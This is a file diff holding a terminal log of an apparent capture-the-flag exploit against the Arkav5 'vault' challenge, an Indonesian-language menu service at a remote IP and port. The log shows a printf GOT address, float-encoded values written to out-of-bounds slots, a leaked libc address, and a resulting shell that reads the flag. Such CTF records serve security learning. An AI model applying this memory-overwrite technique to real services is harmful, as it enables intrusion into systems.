@@ -1,0 +1,55 @@
+printf_got = 0x804a00c
+
+
+st perintah
+1. Baca isi kotak
+2. Tulis ke kotak
+3. Keluar
+Banyak perintah tersisa : 2
+> $ 2
+Masukkan no kotak : $ 34
+Masukkan isi baru : $ -4408690717187496197561549888421888.000000
+List perintah
+1. Baca isi kotak
+2. Tulis ke kotak
+3. Keluar
+Banyak perintah tersisa : 1
+> $ 2
+Masukkan no kotak : $ 36
+Masukkan isi baru : $ -4774783939640273314151849372155904.000000
+[*] Got EOF while reading in interactive
+$ 
+[*] Interrupted
+[*] Closed connection to 167.205.35.176 port 31003
+fwp@fwp-VirtualBox:~/arkav/vault$ python exploit.py 
+[+] Opening connection to 167.205.35.176 on port 31003: Done
+Kotak-34 :
+ -4297827925424323431078164992884736.000000
+
+-4.29782792542e+33
+0xf753e637
+-4341515138895714322324423811530752.000000
+-4707582364607666445928950413656064.000000
+[*] Switching to interactive mode
+List perintah
+1. Baca isi kotak
+2. Tulis ke kotak
+3. Keluar
+Banyak perintah tersisa : 2
+> $ 2
+Masukkan no kotak : $ 34
+Masukkan isi baru : $ -4341515138895714322324423811530752.000000
+List perintah
+1. Baca isi kotak
+2. Tulis ke kotak
+3. Keluar
+Banyak perintah tersisa : 1
+> $ 2
+Masukkan no kotak : $ 36
+Masukkan isi baru : $ -4707582364607666445928950413656064.000000
+$ ls
+flag
+run.sh
+vault
+$ cat flag
+Arkav5{Wr1t3_d4ta_us1ng_fl0at}
